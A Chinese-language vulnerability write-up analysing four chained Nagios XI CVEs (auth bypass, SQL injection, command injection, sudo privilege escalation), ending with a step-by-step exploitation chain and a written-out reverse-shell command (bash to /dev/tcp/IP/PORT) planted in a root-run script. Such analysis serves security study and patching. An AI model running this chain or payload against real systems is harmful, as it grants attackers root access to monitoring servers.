# **0x00背景介绍**  

* * *

  

**Nagios是一个流行的电脑系统和网络监控程序，它检测主机和服务，当异常发生和解除时能提醒用户。nagiosxi是一个企业级服务器和网络监控软件。**

### 漏洞简介

近日，nagiosxi系统被爆了四个CVE漏洞，并且如果将这四个漏洞连起来使用，就能以root权限执行远程代码。  

### 受影响版本

Nagios XI 5.2.6 < 5.2.9 / 5.3 / 5.4

### 漏洞编号

CVE-2018-8734

CVE-2018-8733

CVE-2018-8735

CVE-2018-8736

  

# **0x01漏洞细节**  

* * *

  

### 1.1 CVE-2018-authentication bypass

/nagiosql/admin/settings.php文件第63行，只验证了POST参数是否为空和selLanguage值是否为空，此处并未对登录权限做验证:

![](../Images/84364cab280d420650d77e5a41fa1d73.png)

程序会修改config/settings.php文件，写入提交的数据库用户名、密码。

![](../Images/145882e1a2f16c0c0dff94590619bdb3.png)

登录验证发生在配置修改之后，导致攻击者可以越权修改数据库的连接配置。

### 1.2 CVE-2018-8734-SQL injection

/nagiosql/admin/helpedit.php文件第56行只验证了$chkContent与$chkModus的值，同时$\_POST\['selInfoKey1'\]的值未做任何过滤：

![](../Images/afef1ef9c674d9e465fc19dbf03dd382.png)

就带入getDataArray()进行查询。

![](../Images/042a98c50dbd50de659805882ee49d3d.png)

![](../Images/c36e3fbcaa95a51794e86bbd666422e2.png)

从而导致sql注入漏洞。

### 1.3 CVE-2018-8735-command injection

/nagiosxi/backend/index.php 文件,首先接收POST参数，判断cmd的值，如果cmd=submitcommand进入backend\_submit\_command()函数。

![](../Images/b46532cff9632f49130bb9031571b3c5.png)

  

![](../Images/9d2ae5a23fbe210b49d5f46f8c80fcf8.png)

/backend/includes/handler-commands.inc.php文件，接收参数并提交请求。

![](../Images/62fa0b438d1786795ed56238eba27495.png)

/includes/js/commands.js

![](../Images/bf82a5304f3531f98b8e832c103b4ddf.png)

![](../Images/9888035af4f5ed6b54cca97e53e01dcd.png)

一直跟到nagiosxi/cron/cmdsubsus.php的process\_command()函数。

![](../Images/0c5544821699d24cf2e62d5cf46d5972.png)

![](../Images/48a668e3ec00245df958a7939509cff8.png)

$cmdline经过系统脚本路径与$command\_data拼接后组成要执行的命令。

![](../Images/c759f2aee78a81f9ac07d2a1d73991c0.png)

最后调用system()函数执行$cmdline。

![](../Images/5a73599e5bcaf6a08308ee3ff3029bfd.png)

command的值在/html/includes/constants.inc.php中有定义。

![](../Images/13c52f30645d1b524fa7f046db0c1d2f.png)

### 1.4 CVE-2018-8736-本地特权提升

这里的提权用到了一些技巧。首先看下/etc/sudoers文件内容。

![](../Images/b1bcc01f4ffe7bfb9874cb4fe42a6dd1.png)

文件中指定的脚本能以root权限执行（不熟悉sudoers文件的自行脑补一下），并且配置中指定了nagiosxi目录下的一些shell脚本（当前用户有修改权限），我们可以通过CVE-2018-8735命令执行漏洞修改图中脚本的内容，系统在使用sudo命令调用该脚本的时候，就相当于用root身份执行，从而导致权限提升。

  

**0x02 漏洞利用**

* * *

  

在本地环境中对以上几个漏洞进行验证，测试环境为nagiosxi-5.4.10-x64， ip地址为192.168.113.146

### 2.1 SQL注入

通过sellInfoKey1参数获取管理员的api\_key：

![](../Images/e2c3d7f165556d5155ef46780a550147.png)

### 2.2越权修改配置文件

将数据库用户改为root，默认密码nagiosxi。

![](../Images/96debfd6a1a717b46270397d1207fe2f.png)

### 2.3命令执行

利用$command\_data参数在/tmp目录下创建一个文件。

![](../Images/51f5585e7e7c27f5310d125bb62ca090.png)

### 2.4将这些漏洞串起来使用

```
1.获取nagios版本号
版本号可以从 /nagiosxi/login.php文件获取。
2.将数据库用户修改为root
使用CVE-2018-8733，可以将nagiosql数据库用户修改为root用户，授予其足够的权限来访问nagiosxi的所有数据。
3.获取api\_key
使用CVE-2018-8734执行SQL注入，该注入将返回系统中所有唯一的API密钥
4.使用API\_KEY添加管理用户。
5.登录
登录后可以执行命令（命令执行需要登录认证）。
6.提升权限
使用CVE-2018-8735命令执行漏洞，执行以下操作，将一个shell写入reset\_config\_perms.sh文件中。
```

```
234    cp /usr/local/nagiosxi/scripts/reset\_config\_perms.sh /usr/local/nagiosxi/scripts/reset\_config\_perms.sh.bak &&
echo "bash -i >& /dev/tcp/IP/PORT 0>&1 &" > /usr/local/nagiosxi/scripts/reset\_config\_perms.sh &&
sudo /usr/local/nagiosxi/scripts/reset\_config\_perms.sh &&
mv /usr/local/nagiosxi/scripts/reset\_config\_perms.sh.bak /usr/local/nagiosxi/scripts/reset\_config\_perms.sh
```

反弹一个shell，其中IP、PORT为反连主机的IP、端口

然后使用无密码的sudo命令调用该脚本，从而拿到root权限。
